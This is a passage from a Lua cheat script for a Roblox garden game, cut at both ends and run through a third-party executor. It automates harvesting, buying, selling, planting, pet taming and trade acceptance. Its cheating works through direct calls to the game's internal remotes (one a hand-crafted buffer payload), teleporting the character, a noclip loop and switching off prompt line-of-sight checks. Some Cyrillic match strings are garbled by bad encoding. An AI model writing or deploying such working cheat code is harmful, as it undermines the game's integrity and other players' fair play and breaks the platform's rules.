    if not isfile or not readfile then return end
    pcall(function()
        if isfile(configFileName) then
            local data = HttpService:JSONDecode(readfile(configFileName))
            for _, zData in ipairs(data) do
                local assignSeed = zData.Seed
                local seedHash = 0
                for i = 1, #assignSeed do
                    seedHash = seedHash + string.byte(assignSeed, i) * i
                end
                local hue = (seedHash % 30) / 30

                local zonePart = Instance.new("Part")
                zonePart.Anchored = true
                zonePart.CanCollide = false
                if zData.SizeX then
                    zonePart.Size = Vector3.new(zData.SizeX, zData.SizeY, zData.SizeZ)
                else
                    zonePart.Size = Vector3.new(0.5, 5, 5)
                end
                zonePart.Position = Vector3.new(zData.PosX, zData.PosY, zData.PosZ)
                zonePart.Color = Color3.fromHSV(hue, 0.85, 0.9)
                zonePart.Material = Enum.Material.Neon
                zonePart.Transparency = 0.6
                zonePart.Parent = workspace

                table.insert(PlantZones, {
                    Part = zonePart,
                    Seed = assignSeed,
                    RelCFrame = DeserializeCFrame(zData.RelCFrame)
                })
            end
        end
    end)
end

LoadZones()

task.spawn(function()
    while _G.GAG2_Running do
        task.wait(1)
        local plotCFrame = GetPlayerPlotCFrame()
        if plotCFrame then
            for _, zone in ipairs(PlantZones) do
                if zone.RelCFrame and zone.Part then
                    zone.Part.CFrame = plotCFrame:ToWorldSpace(zone.RelCFrame)
                end
            end
        end
    end
end)

PlantSection:AddLabel("Assign Zones Mode"):AddToggle({
    Default = false,
    Flag = "SelectionMode",
    Callback = function(val)
        SelectionMode = val
        if val then
            SelectionStep = 1
            if TempSelectionMarker then TempSelectionMarker:Destroy() TempSelectionMarker = nil end
            Notification.new({
                Title = "Zone Selection",
                Content = "Click the FIRST corner of the zone for " .. tostring(Toggles.assign_seed) .. ".",
                Duration = 4,
            })
        else
            SelectionStep = 0
            if TempSelectionMarker then TempSelectionMarker:Destroy() TempSelectionMarker = nil end
        end
    end
})

PlantSection:AddButton({
    Name = "Clear All Zones",
    Callback = function()
        for _, zone in ipairs(PlantZones) do
            if zone.Part then zone.Part:Destroy() end
        end
        table.clear(PlantZones)
        if TempSelectionMarker then TempSelectionMarker:Destroy() TempSelectionMarker = nil end
        SelectionStep = SelectionMode and 1 or 0
        SaveZones()
        Notification.new({Title="Cleared", Content="All planting zones cleared.", Duration=2})
    end
})

local ActivePrompts = {}

local function CheckForPrompt(obj)
    pcall(function()
        if obj:IsA("ProximityPrompt") then
            local isFruit = false
            local pObj = obj.Parent
            while pObj and pObj ~= workspace do
                if pObj:GetAttribute("PlantId") or pObj:GetAttribute("FruitId") then
                    isFruit = true
                    break
                end
                pObj = pObj.Parent
            end

            if isFruit then
                ActivePrompts[obj] = true
            else
                local action = string.lower(obj.ActionText)
                local name = string.lower(obj.Name)
                if action:find("harvest") or action:find("collect") or action:find("РЎРѓР С•Р В±РЎР‚Р В°РЎвЂљРЎРЉ") or action:find("chop") or action:find("РЎРѓРЎР‚РЎС“Р В±Р С‘РЎвЂљРЎРЉ") or name:find("harvest") or name:find("collect") or name:find("chop") then
                    ActivePrompts[obj] = true
                end
            end
        end
    end)
end

local gardensFolder = Workspace:FindFirstChild("Gardens") or Workspace

for _, obj in ipairs(gardensFolder:GetDescendants()) do
    CheckForPrompt(obj)
end

Workspace.DescendantAdded:Connect(CheckForPrompt)

Workspace.DescendantRemoving:Connect(function(obj)
    if ActivePrompts[obj] then
        ActivePrompts[obj] = nil
    end
end)

task.spawn(function()
    local Networking = require(ReplicatedStorage:WaitForChild("SharedModules"):WaitForChild("Networking"))
    while _G.GAG2_Running do
        task.wait(0.2)
        if Toggles.AutoHarvest then
            pcall(function()
                local maxWeightKg = parseNumberAbbr(Toggles.MaxHarvestWeight)

                local myPlotId = Players.LocalPlayer:GetAttribute("PlotId")
                if not myPlotId then return end
                local myPlotName = "Plot" .. tostring(myPlotId)
                local gardens = workspace:FindFirstChild("Gardens")
                if not gardens then return end
                local myPlot = gardens:FindFirstChild(myPlotName)
                if not myPlot then return end

                for _, pObj in ipairs(CollectionService:GetTagged("PlantPrompt")) do
                    if pObj:IsA("ProximityPrompt") and pObj.Enabled and pObj.ActionText == "Harvest" then

                        task.spawn(function()
                            if pObj:IsDescendantOf(myPlot) then

                                local pNode = pObj.Parent
                                local plantId, fruitId
                                while pNode and pNode ~= workspace do
                                    if not plantId then plantId = pNode:GetAttribute("PlantId") end
                                    if not fruitId then fruitId = pNode:GetAttribute("FruitId") end
                                    if plantId and fruitId then break end
                                    pNode = pNode.Parent
                                end

                                if plantId then
                                    local skip = false
                                    if maxWeightKg > 0 then
                                        local plant = GetPlantModelFromPrompt(pObj)
                                        if plant then
                                            local weightKg = GetPlantWeight(plant, pObj)
                                            if weightKg > maxWeightKg then
                                                skip = true
                                            end
                                        end
                                    end

                                    if not skip then
                                        Networking.Garden.CollectFruit:Fire(plantId, fruitId or "")
                                        pObj.Enabled = false
                                    end
                                else
                                    local rootPart = Players.LocalPlayer.Character and Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
                                    if rootPart and fireproximityprompt then
                                        fireproximityprompt(pObj, 1, true)
                                        pObj.Enabled = false
                                    end
                                end
                            end
                        end)
                    end
                end
            end)
        end
    end
end)

local function GetMultiDropdown(flagName)
    local selected = {}
    local val = Toggles[flagName]
    if type(val) == "table" then
        for k, v in pairs(val) do
            if type(k) == "number" then
                table.insert(selected, v)
            elseif v == true then
                table.insert(selected, k)
            end
        end
    elseif type(val) == "string" then
        table.insert(selected, val)
    end
    return selected
end

local UserInputService = game:GetService("UserInputService")
local CurrentCamera = workspace.CurrentCamera

UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end
    if SelectionMode and (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then
        local mousePos = UserInputService:GetMouseLocation()
        local ray = CurrentCamera:ViewportPointToRay(mousePos.X, mousePos.Y)

        local raycastParams = RaycastParams.new()
        raycastParams.FilterType = Enum.RaycastFilterType.Include
        raycastParams.FilterDescendantsInstances = CollectionService:GetTagged("PlantArea")

        local hit = workspace:Raycast(ray.Origin, ray.Direction * 5000, raycastParams)
        if hit and hit.Instance then
            local hitPos = hit.Position
            local assignSeed = tostring(Toggles.assign_seed)
            if assignSeed and assignSeed ~= "" then
                if SelectionStep == 1 then
                    SelectionStep = 2

                    TempSelectionMarker = Instance.new("Part")
                    TempSelectionMarker.Anchored = true
                    TempSelectionMarker.CanCollide = false
                    TempSelectionMarker.Size = Vector3.new(1, 1, 1)
                    TempSelectionMarker.Position = hitPos
                    TempSelectionMarker.Color = Color3.new(1, 1, 0)
                    TempSelectionMarker.Material = Enum.Material.Neon
                    TempSelectionMarker.Parent = workspace

                    Notification.new({
                        Title = "Corner 1 Set",
                        Content = "Now click the SECOND corner to complete the zone.",
                        Duration = 3,
                    })
                elseif SelectionStep == 2 then
                    SelectionStep = 1

                    local p1 = TempSelectionMarker.Position
                    local p2 = hitPos

                    local plotCFrame = GetPlayerPlotCFrame()

                    local sizeX, sizeZ, centerX, centerY, centerZ
                    local zoneCFrame

                    if plotCFrame then
                        local relP1 = plotCFrame:PointToObjectSpace(p1)
                        local relP2 = plotCFrame:PointToObjectSpace(p2)

                        local minX = math.min(relP1.X, relP2.X)
                        local maxX = math.max(relP1.X, relP2.X)
                        local minZ = math.min(relP1.Z, relP2.Z)
                        local maxZ = math.max(relP1.Z, relP2.Z)

                        centerX = (minX + maxX) / 2
                        centerZ = (minZ + maxZ) / 2
                        centerY = math.max(relP1.Y, relP2.Y) + 0.1

                        sizeX = math.abs(maxX - minX)
                        sizeZ = math.abs(maxZ - minZ)
                        if sizeX < 1 then sizeX = 1 end
                        if sizeZ < 1 then sizeZ = 1 end

                        zoneCFrame = plotCFrame:ToWorldSpace(CFrame.new(centerX, centerY, centerZ))
                    else
                        local minX = math.min(p1.X, p2.X)
                        local maxX = math.max(p1.X, p2.X)
                        local minZ = math.min(p1.Z, p2.Z)
                        local maxZ = math.max(p1.Z, p2.Z)

                        centerX = (minX + maxX) / 2
                        centerZ = (minZ + maxZ) / 2
                        centerY = math.max(p1.Y, p2.Y) + 0.1

                        sizeX = math.abs(maxX - minX)
                        sizeZ = math.abs(maxZ - minZ)
                        if sizeX < 1 then sizeX = 1 end
                        if sizeZ < 1 then sizeZ = 1 end

                        zoneCFrame = CFrame.new(centerX, centerY, centerZ)
                    end

                    local seedHash = 0
                    for i = 1, #assignSeed do
                        seedHash = seedHash + string.byte(assignSeed, i) * i
                    end
                    local hue = (seedHash % 30) / 30

                    local zonePart = Instance.new("Part")
                    zonePart.Anchored = true
                    zonePart.CanCollide = false
                    zonePart.Size = Vector3.new(sizeX, 0.2, sizeZ)
                    zonePart.CFrame = zoneCFrame
                    zonePart.Color = Color3.fromHSV(hue, 0.85, 0.9)
                    zonePart.Material = Enum.Material.Neon
                    zonePart.Transparency = 0.6
                    zonePart.Parent = workspace

                    local relCFrame = nil
                    if plotCFrame then
                        relCFrame = plotCFrame:ToObjectSpace(zonePart.CFrame)
                    end

                    table.insert(PlantZones, {
                        Part = zonePart,
                        Seed = assignSeed,
                        RelCFrame = relCFrame
                    })
                    SaveZones()

                    if TempSelectionMarker then TempSelectionMarker:Destroy() TempSelectionMarker = nil end

                    Notification.new({
                        Title = "Zone Created",
                        Content = "Created planting zone for " .. assignSeed .. ".",
                        Duration = 3,
                    })
                end
            end
        end
    end
end)

local function AttemptPlant(pos, seedName)
    local char = Players.LocalPlayer.Character
    if not char then return end
    local humanoid = char:FindFirstChildOfClass("Humanoid")
    if not humanoid then return end

    local backpack = Players.LocalPlayer:FindFirstChild("Backpack")
    local tool = char:FindFirstChild(seedName)

    if not tool and backpack then
        tool = backpack:FindFirstChild(seedName)
        if not tool then
            for _, obj in ipairs(backpack:GetChildren()) do
                if obj:GetAttribute("SeedTool") == seedName then
                    tool = obj
                    break
                end
            end
        end
    end

    if tool then
        if tool.Parent ~= char then
            humanoid:EquipTool(tool)
            local t = 0
            while tool.Parent ~= char and t < 1 do
                task.wait(0.05)
                t = t + 0.05
            end
            task.wait(0.05)
        end
        Networking.Plant.PlantSeed:Fire(pos, seedName, tool)
    end
end

task.spawn(function()
    while _G.GAG2_Running do
        task.wait(0.5)
        if Toggles.AutoSell then
            pcall(function()
                Networking.NPCS.SellAll:Fire()
            end)
        end
    end
end)

task.spawn(function()
    while _G.GAG2_Running do
        task.wait(0.5)
        if Toggles.AutoDropFruits then
            local success, err = pcall(function()
                local LocalPlayer = game:GetService("Players").LocalPlayer
                local Character = LocalPlayer.Character
                if not Character then return end

                local Humanoid = Character:FindFirstChildOfClass("Humanoid")
                if not Humanoid then return end

                local Backpack = LocalPlayer:FindFirstChild("Backpack")
                if not Backpack then return end

                local ReplicatedStorage = game:GetService("ReplicatedStorage")
                local RemoteEvent = ReplicatedStorage:WaitForChild("SharedModules"):WaitForChild("Packet"):WaitForChild("RemoteEvent")

                for _, item in pairs(Backpack:GetChildren()) do
                    if item:IsA("Tool") and item:GetAttribute("HarvestedFruit") == true then
                        local id = item:GetAttribute("Id")
                        if id then Networking.Backpack.DemoteFruit:Fire(id) end
                    end
                end

                local fruitIds = {}
                local function collectFruits(parent)
                    for _, item in pairs(parent:GetChildren()) do
                        local isTool = item:IsA("Tool") and item:GetAttribute("HarvestedFruit") == true
                        local isProxy = item:IsA("Configuration") and item:GetAttribute("FruitProxy") == true

                        if isTool or isProxy then
                            local id = item:GetAttribute("Id")
                            if id then
                                fruitIds[id] = item:GetAttribute("Fruit") or "Unknown Fruit"
                            end
                        end
                    end
                end

                collectFruits(Backpack)
                collectFruits(Character)

                local count = 0
                for fruitId, fruitName in pairs(fruitIds) do
                    count = count + 1

                    Networking.Backpack.PromoteFruit:Fire(fruitId)

                    local targetTool = nil
                    for i = 1, 20 do
                        for _, item in pairs(Backpack:GetChildren()) do
                            if item:IsA("Tool") and item:GetAttribute("Id") == fruitId then
                                targetTool = item
                                break
                            end
                        end
                        if not targetTool then
                            for _, item in pairs(Character:GetChildren()) do
                                if item:IsA("Tool") and item:GetAttribute("Id") == fruitId then
                                    targetTool = item
                                    break
                                end
                            end
                        end
                        if targetTool then break end
                        task.wait(0.1)
                    end

                    if targetTool then
                        Humanoid:EquipTool(targetTool)
                        task.wait(0.2)

                        local payload = "0\1\15HarvestedFruits$" .. fruitId
                        local args = { buffer.fromstring(payload) }
                        RemoteEvent:FireServer(unpack(args))

                        task.wait(0.2)
                    end

                    if not Toggles.AutoDropFruits then break end
                end
            end)
            if not success then
            end

            Toggles.AutoDropFruits = false
            if getgenv and getgenv()._GAG2_ValueGui then
            end
        end
    end
end)

local gearBuyConn
task.spawn(function()
    local lastGearBuy = 0
    gearBuyConn = game:GetService("RunService").Heartbeat:Connect(function()
        if not _G.GAG2_Running then
            if gearBuyConn then gearBuyConn:Disconnect() end
            return
        end
        if Toggles.AutoBuyGears then
            local isFree = not getgenv()._GAG2_Premium
            local canBuy = true

            if isFree then
                if tick() - lastGearBuy < 1 then
                    canBuy = false
                end

                local GearShop = workspace.Map:FindFirstChild("GearShop")
                if GearShop then
                    local UnixNextRestock = GearShop:FindFirstChild("UnixNextRestock")
                    if UnixNextRestock then
                        local remaining = UnixNextRestock.Value - os.time()
                        if remaining <= 2 and remaining >= -1 then
                            canBuy = false
                        end
                    end
                end
            end

            if canBuy then
                lastGearBuy = tick()
                local buyGears = GetMultiDropdown("buy_gears")
                pcall(function()
                    for _, gearName in ipairs(buyGears) do
                        Networking.GearShop.PurchaseGear:Fire(gearName)
                    end
                end)
            end
        end
    end)
end)

local seedBuyConn
task.spawn(function()
    local lastSeedBuy = 0
    seedBuyConn = game:GetService("RunService").Heartbeat:Connect(function()
        if not _G.GAG2_Running then
            if seedBuyConn then seedBuyConn:Disconnect() end
            return
        end
        if Toggles.AutoBuy then
            local isFree = not getgenv()._GAG2_Premium
            local canBuy = true

            if isFree then
                if tick() - lastSeedBuy < 1 then
                    canBuy = false
                end

                local SeedShop = workspace.Map:FindFirstChild("SeedShop")
                if SeedShop then
                    local UnixNextRestock = SeedShop:FindFirstChild("UnixNextRestock")
                    if UnixNextRestock then
                        local remaining = UnixNextRestock.Value - os.time()
                        if remaining <= 2 and remaining >= -1 then
                            canBuy = false
                        end
                    end
                end
            end

            if canBuy then
                lastSeedBuy = tick()
                local buySeeds = GetMultiDropdown("buy_seeds")
                pcall(function()
                    for _, seedName in ipairs(buySeeds) do
                        Networking.SeedShop.PurchaseSeed:Fire(seedName)
                    end
                end)
            end
        end
    end)
end)

local IsPlanting = false
task.spawn(function()
    while _G.GAG2_Running and task.wait(0.1) do

        if Toggles.AutoPlant and not IsPlanting then
            IsPlanting = true
            task.spawn(function()
                pcall(function()
                    local plantSeeds = GetMultiDropdown("plant_seeds")
                    if #plantSeeds == 0 then return end

                    local isSeedSelected = {}
                    for _, s in ipairs(plantSeeds) do isSeedSelected[s] = true end

                    local assignedSeeds = {}
                    if #PlantZones > 0 then
                        local sortedZones = {}
                        for _, v in ipairs(PlantZones) do table.insert(sortedZones, v) end
                        table.sort(sortedZones, function(a, b) return a.Seed < b.Seed end)

                        for _, zone in ipairs(sortedZones) do
                            if isSeedSelected[zone.Seed] then
                                assignedSeeds[zone.Seed] = true

                                for i = 1, 4 do
                                    local size = zone.Part.Size
                                local randX = (math.random() - 0.5) * size.X
                                local randZ = (math.random() - 0.5) * size.Z

                                local topPos = zone.Part.CFrame * Vector3.new(randX, 10, randZ)
                                local rayParams = RaycastParams.new()
                                rayParams.FilterType = Enum.RaycastFilterType.Exclude

                                local ignoreList = {}
                                local char = Players.LocalPlayer.Character
                                if char then table.insert(ignoreList, char) end
                                for _, z in ipairs(PlantZones) do table.insert(ignoreList, z.Part) end
                                if TempSelectionMarker then table.insert(ignoreList, TempSelectionMarker) end

                                rayParams.FilterDescendantsInstances = ignoreList

                                local hit = workspace:Raycast(topPos, Vector3.new(0, -20, 0), rayParams)
                                if hit then
                                    AttemptPlant(hit.Position, zone.Seed)
                                end
                                if not Toggles.AutoPlant then return end
                            end
                        end
                    end
                end

                    local remainingSeeds = {}
                    for _, seed in ipairs(plantSeeds) do
                        if not assignedSeeds[seed] then
                            table.insert(remainingSeeds, seed)
                        end
                    end

                    if #remainingSeeds > 0 then
                        local allPlots = CollectionService:GetTagged("PlantArea")
                        local myPlots = {}

                        for _, plot in ipairs(allPlots) do
                            local p = plot
                            local isMine = false
                            while p and p ~= workspace do
                                local pName = tostring(p.Name)
                                local ownerAttr = p:GetAttribute("Owner")
                                local ownerUserIdAttr = p:GetAttribute("OwnerUserId")
                                if pName == Players.LocalPlayer.Name or pName == tostring(Players.LocalPlayer.UserId) then
                                    isMine = true; break
                                end
                                if ownerAttr == Players.LocalPlayer.UserId or ownerAttr == Players.LocalPlayer.Name then
                                    isMine = true; break
                                end
                                if ownerUserIdAttr == Players.LocalPlayer.UserId or ownerUserIdAttr == tostring(Players.LocalPlayer.UserId) then
                                    isMine = true; break
                                end
                                p = p.Parent
                            end
                            if isMine then table.insert(myPlots, plot) end
                        end

                        if #myPlots == 0 then
                            local char = Players.LocalPlayer.Character
                            if char and char.PrimaryPart then
                                local charPos = char.PrimaryPart.Position
                                for _, plot in ipairs(allPlots) do
                                    if (plot.Position - charPos).Magnitude < 150 then
                                        table.insert(myPlots, plot)
                                    end
                                end
                            end
                        end

                        for _, plot in ipairs(myPlots) do
                            for _, currentSeed in ipairs(remainingSeeds) do
                                for i = 1, 4 do
                                    local size = plot.Size
                                    local randX = (math.random() - 0.5) * (size.X - 2)
                                    local randZ = (math.random() - 0.5) * (size.Z - 2)
                                    local topPos = plot.CFrame * Vector3.new(randX, size.Y, randZ)
                                    local rayParams = RaycastParams.new()
                                    rayParams.FilterType = Enum.RaycastFilterType.Include
                                    rayParams.FilterDescendantsInstances = { plot }
                                    local hit = workspace:Raycast(topPos, Vector3.new(0, -size.Y * 2, 0), rayParams)
                                    if hit then
                                        AttemptPlant(hit.Position, currentSeed)
                                    end
                                    if not Toggles.AutoPlant then return end
                                end
                                if not Toggles.AutoPlant then return end
                            end
                        end
                    end
                end)
                task.wait()
                IsPlanting = false
            end)
        end

        if Toggles.AutoHarvest then
            local maxWeightKg = parseNumberAbbr(Toggles.MaxHarvestWeight)
            for prompt, _ in pairs(ActivePrompts) do
                pcall(function()
                    if not (prompt and prompt.Parent and prompt.Enabled) then
                        ActivePrompts[prompt] = nil
                        return
                    end

                    if maxWeightKg > 0 then
                        local plant = GetPlantModelFromPrompt(prompt)
                        if plant then
                            local weightKg = GetPlantWeight(plant, prompt)
                            local plantName = plant:GetAttribute("SeedName") or plant:GetAttribute("PlantName") or "Unknown"
                            if weightKg > maxWeightKg then
                                return
                            end
                        end
                    end

                    if fireproximityprompt then
                        fireproximityprompt(prompt)
                    end

                    local pObj = prompt.Parent
                    while pObj and pObj ~= workspace do
                        local plantId = pObj:GetAttribute("PlantId")
                        local fruitId = pObj:GetAttribute("FruitId")
                        if plantId then
                            Networking.Garden.CollectFruit:Fire(plantId, fruitId or "")
                            break
                        end
                        pObj = pObj.Parent
                    end
                end)
            end
        end
    end
end)

Notification.new({
	Title = "Injected",
	Content = "GAG2 Autofarm successfully loaded!",
	Duration = 5,
})

local ActiveTaming = {}
task.spawn(function()
    while _G.GAG2_Running do
        task.wait(1)
        if Toggles.AutoTamePets then
            pcall(function()
                local selectedPets = Toggles.tame_pets or {}
                if next(selectedPets) == nil then return end

                local char = Players.LocalPlayer.Character
                local rootPart = char and char:FindFirstChild("HumanoidRootPart")

                for _, prompt in ipairs(workspace:GetDescendants()) do
                    if not Toggles.AutoTamePets then break end
                    if prompt:IsA("ProximityPrompt") and prompt.Enabled then
                        local action = string.lower(prompt.ActionText)
                        if action:find("tame") or action:find("приручить") or action:find("buy") then
                            local petInstance = prompt.Parent
                            if petInstance and not ActiveTaming[petInstance] then

                                local wantThisPet = false
                                pcall(function()
                                    for sName, isSelected in pairs(selectedPets) do
                                        if isSelected then
                                            local cleanSName = string.lower((string.gsub(sName, "[%s_]", "")))
                                            local pluralSName = (string.gsub(cleanSName, "y$", "ie"))

                                            local currNode = petInstance
                                            while currNode and currNode ~= workspace do
                                                local testName = currNode:GetAttribute("PetName") or currNode.Name
                                                local cleanTest = string.lower((string.gsub(testName, "[%s_]", "")))

                                                if string.find(cleanTest, cleanSName, 1, true) or string.find(cleanTest, pluralSName, 1, true) then
                                                    wantThisPet = true
                                                    break
                                                end
                                                currNode = currNode.Parent
                                            end
                                        end
                                        if wantThisPet then break end
                                    end
                                end)

                                if wantThisPet and prompt.Enabled then
                                    ActiveTaming[petInstance] = true

                                    local originalCFrame = rootPart and rootPart.CFrame

                                    task.spawn(function()
                                        local noclipConn = game:GetService("RunService").Stepped:Connect(function()
                                            if char then
                                                for _, part in ipairs(char:GetDescendants()) do
                                                    if part:IsA("BasePart") and part.CanCollide then
                                                        part.CanCollide = false
                                                    end
                                                end
                                            end
                                        end)

                                        local tamingLoopActive = true
                                        task.spawn(function()
                                            while tamingLoopActive and rootPart and petInstance and petInstance.Parent do
                                                pcall(function()
                                                    local targetCFrame = petInstance:IsA("BasePart") and petInstance.CFrame or petInstance:GetPivot()
                                                    rootPart.CFrame = targetCFrame + Vector3.new(0, 2, 0)
                                                    rootPart.Velocity = Vector3.zero
                                                end)
                                                task.wait()
                                            end
                                        end)

                                        local attempts = 0
                                        while petInstance and petInstance.Parent and prompt and prompt.Parent and prompt.Enabled and Toggles.AutoTamePets and attempts < 3 do
                                            local originalLoS = prompt.RequiresLineOfSight
                                            pcall(function() prompt.RequiresLineOfSight = false end)

                                            local holdDur = prompt.HoldDuration > 0 and prompt.HoldDuration or 2
                                            pcall(function() prompt:InputHoldBegin() end)
                                            if fireproximityprompt then
                                                pcall(function() fireproximityprompt(prompt, 1, true) end)
                                            end
                                            task.wait(holdDur + 1.2)
                                            pcall(function() prompt:InputHoldEnd() end)

                                            pcall(function() prompt.RequiresLineOfSight = originalLoS end)

                                            task.wait(0.2)
                                            attempts = attempts + 1
                                        end

                                        tamingLoopActive = false
                                        ActiveTaming[petInstance] = nil

                                        if noclipConn then
                                            noclipConn:Disconnect()
                                        end

                                        if rootPart and originalCFrame then
                                            rootPart.CFrame = originalCFrame
                                            rootPart.Velocity = Vector3.zero
                                        end
                                    end)

                                    while ActiveTaming[petInstance] and Toggles.AutoTamePets do
                                        task.wait(0.5)
                                    end
                                end
                            end
                        end
                    end
                end
            end)
        end
    end
end)

task.spawn(function()
    while _G.GAG2_Running do
        task.wait(0.5)
        if Toggles.AutoAcceptTrades then
            pcall(function()
                local playerGui = Players.LocalPlayer:FindFirstChild("PlayerGui")
                if playerGui then
                    local giftingUI = playerGui:FindFirstChild("Gifting")
                    if giftingUI and giftingUI.Enabled then
                        local acceptBtn = giftingUI:FindFirstChild("Notification")
                                          and giftingUI.Notification:FindFirstChild("Buttons")
                                          and giftingUI.Notification.Buttons:FindFirstChild("AcceptButton")

                        if acceptBtn then
                            if getconnections then
                                for _, conn in ipairs(getconnections(acceptBtn.Activated)) do pcall(function() conn:Function() end) end
                                for _, conn in ipairs(getconnections(acceptBtn.MouseButton1Click)) do pcall(function() conn:Function() end) end
                            end
                            pcall(function()
                                local VirtualUser = game:GetService("VirtualUser")
                                local absPos = acceptBtn.AbsolutePosition
                                local absSize = acceptBtn.AbsoluteSize
                                VirtualUser:ClickButton1(Vector2.new(absPos.X + absSize.X/2, absPos.Y + absSize.Y/2))
                            end)
                        end
                    end

                    for _, screenGui in ipairs(playerGui:GetChildren()) do
                        if screenGui:IsA("ScreenGui") and screenGui.Enabled and screenGui.Name ~= "Gifting" then
                            local isTrade = false
                            local acceptBtns = {}

                            for _, inst in ipairs(screenGui:GetDescendants()) do
                                local text = ""
                                if inst:IsA("TextLabel") or inst:IsA("TextButton") then
                                    text = string.lower(inst.Text)
                                end
                                local name = string.lower(inst.Name)

                                if text:find("trade") or text:find("обмен") or text:find("invite") or text:find("приглаш") or name:find("trade") or name:find("invite") then
                                    isTrade = true
                                end

                                if inst:IsA("TextButton") or inst:IsA("ImageButton") then
                                    if text:find("accept") or text:find("принять") or text:find("yes") or text:find("да") or name:find("accept") or name:find("yes") then
                                        if inst.AbsoluteSize.X > 0 and inst.AbsoluteSize.Y > 0 then
                                            table.insert(acceptBtns, inst)
                                        end
                                    end
                                end
                            end

                            if isTrade and #acceptBtns > 0 then
                                for _, btn in ipairs(acceptBtns) do
                                    if getconnections then
                                        for _, conn in ipairs(getconnections(btn.MouseButton1Click)) do pcall(function() conn:Function() end) end
                                        for _, conn in ipairs(getconnections(btn.Activated)) do pcall(function() conn:Function() end) end
                                    end
                                    pcall(function()
                                        local VirtualUser = game:GetService("VirtualUser")
                                        local absPos = btn.AbsolutePosition
                                        local absSize = btn.AbsoluteSize
                                        VirtualUser:ClickButton1(Vector2.new(absPos.X + absSize.X/2, absPos.Y + absSize.Y/2))
                                    end)
                                end
                            end
                        end
                    end
                end
            end)
        end
    end
end)

local ActiveSeedCollection = {}
task.spawn(function()
    while _G.GAG2_Running do
        task.wait(1)
        if Toggles.AutoCollectSeeds then
            pcall(function()
                local rootPart = Players.LocalPlayer.Character and Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")

                for _, prompt in ipairs(workspace:GetDescendants()) do
                    if prompt:IsA("ProximityPrompt") and prompt.Enabled then
                        local pName = string.lower(prompt.Parent and prompt.Parent.Name or "")
                        local objText = string.lower(prompt.ObjectText or "")
                        local action = string.lower(prompt.ActionText or "")

                        local isSeedOrPack = action:find("open") or action:find("collect") or action:find("grab") or action:find("pick") or pName:find("seed") or pName:find("pack") or objText:find("seed") or objText:find("pack")
                        local isGoldenOrRainbow = pName:find("gold") or pName:find("rainbow") or objText:find("gold") or objText:find("rainbow") or (prompt.Parent and (prompt.Parent:GetAttribute("GoldSeed") or prompt.Parent:GetAttribute("RainbowSeed") or prompt.Parent:GetAttribute("SeedPack")))

                        if isSeedOrPack or isGoldenOrRainbow then
                            local seedInstance = prompt.Parent
                            if seedInstance and not ActiveSeedCollection[seedInstance] then
                                ActiveSeedCollection[seedInstance] = true

                                local originalCFrame = rootPart and rootPart.CFrame

                                task.spawn(function()
                                    if rootPart then
                                        local targetCFrame = seedInstance:IsA("Model") and seedInstance:GetPivot() or (seedInstance:IsA("BasePart") and seedInstance.CFrame or nil)
                                        if targetCFrame then
                                            rootPart.CFrame = targetCFrame + Vector3.new(0, 2, 0)
                                        end
                                    end

                                    task.wait(0.2)

                                    while seedInstance.Parent and prompt.Parent and prompt.Enabled and Toggles.AutoCollectSeeds do
                                        if fireproximityprompt then
                                            fireproximityprompt(prompt, 1, true)
                                        end
                                        task.wait(0.1)
                                    end

                                    ActiveSeedCollection[seedInstance] = nil

                                    if rootPart and originalCFrame then
                                        rootPart.CFrame = originalCFrame
                                    end
                                end)

                                while ActiveSeedCollection[seedInstance] and Toggles.AutoCollectSeeds do
                                    task.wait(0.5)
                                end
                            end
                        end
                    end
                end
            end)
        end
    end
end)

local function _detectExecutor()
    local ok, name, ver
    ok, name, ver = pcall(function() return identifyexecutor() end)
    if ok and name then
        if ver and ver ~= "" then return tostring(name) .. " " .. tostring(ver) end
        return tostring(name)
    end
    ok, name = pcall(function() return getexecutorname and getexecutorname() end)
    if ok and name then return tostring(name) end
    if _G and _G.executor then return tostring(_G.executor) end
    return "Unknown Executor"
end

local GearZones = {}
local tempGearSelectionMarker = nil
local GearSelectionMode = false
local GearSelectionStep = 0
local configGearFileName = "GAG2_GearZones.json"

local function SaveGearZones()
    if not writefile then return end
    local data = {
        Zones = {},
        Settings = {
            WateringAmount = Toggles.WateringAmount,
            WateringInterval = Toggles.WateringInterval
        }
    }
    for _, zone in ipairs(GearZones) do
        if zone.Part then
            table.insert(data.Zones, {
                Gear = zone.Gear,
                PosX = zone.Part.Position.X,
                PosY = zone.Part.Position.Y,
                PosZ = zone.Part.Position.Z,
                SizeX = zone.Part.Size.X,
                SizeY = zone.Part.Size.Y,
                SizeZ = zone.Part.Size.Z,
                RelCFrame = SerializeCFrame(zone.RelCFrame)
            })
        end
    end
    pcall(function() writefile(configGearFileName, HttpService:JSONEncode(data)) end)
end

local function LoadGearZones()
    if not isfile or not readfile then return end
    pcall(function()
        if isfile(configGearFileName) then
            local data = HttpService:JSONDecode(readfile(configGearFileName))
            local zonesArray = data
            if data.Settings then
                Toggles.WateringAmount = data.Settings.WateringAmount or 1
                Toggles.WateringInterval = data.Settings.WateringInterval or 5
                zonesArray = data.Zones or {}
            end

            for _, zData in ipairs(zonesArray) do
                local zonePart = Instance.new("Part")
                zonePart.Anchored = true
                zonePart.CanCollide = false
                zonePart.Size = Vector3.new(zData.SizeX, zData.SizeY, zData.SizeZ)
                zonePart.Position = Vector3.new(zData.PosX, zData.PosY, zData.PosZ)
                zonePart.Color = Color3.new(0, 1, 1)
                zonePart.Material = Enum.Material.ForceField
                zonePart.Transparency = 0.5
                zonePart.Parent = workspace

                table.insert(GearZones, {
                    Part = zonePart,
                    Gear = zData.Gear,
                    RelCFrame = DeserializeCFrame(zData.RelCFrame)
                })
            end
        end
    end)
end
LoadGearZones()

task.spawn(function()
    while _G.GAG2_Running do
        task.wait(1)
        local plotCFrame = GetPlayerPlotCFrame()
        if plotCFrame then
            for _, zone in ipairs(GearZones) do
                if zone.RelCFrame and zone.Part then
                    zone.Part.CFrame = plotCFrame:ToWorldSpace(zone.RelCFrame)
                end
            end
        end
    end
end)

local GearSection = FarmingTab:AddSection({
    Name = "Smart Gear & Watering",
    Position = "left"
})

Toggles.GearSelectionMode = false
Toggles.assign_gear = "Common Sprinkler"
Toggles.AutoPlaceGears = false
Toggles.WateringAmount = 1
Toggles.WateringInterval = 5

GearSection:AddLabel("Assign Gear Points"):AddToggle({
    Default = false,
    Flag = "GearSelectionMode",
